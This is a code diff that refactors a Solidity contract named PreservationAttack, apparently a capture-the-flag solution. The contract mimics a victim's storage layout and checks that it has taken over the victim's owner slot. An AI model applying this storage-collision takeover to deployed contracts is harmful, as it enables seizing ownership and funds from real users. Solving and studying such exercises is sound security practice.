@@ -8,14 +8,10 @@ contract PreservationAttack {
     address private slot0;
     address private slot1;
     uint256 private slot2;
-    IPreservation public immutable victimPreservation;
+    IPreservation private immutable victimPreservation;
 
     constructor(IPreservation victimPreservation_) {
         victimPreservation = victimPreservation_;
-    }
-
-    function setTime(uint256 _time) public {
-        slot2 = _time;
     }
 
     function attack() external {
@@ -32,5 +28,9 @@ contract PreservationAttack {
             msg.sender == victimPreservation.owner(),
             "Preservation: Attack failed"
         );
+    }
+
+    function setTime(uint256 _time) public {
+        slot2 = _time;
     }
 }
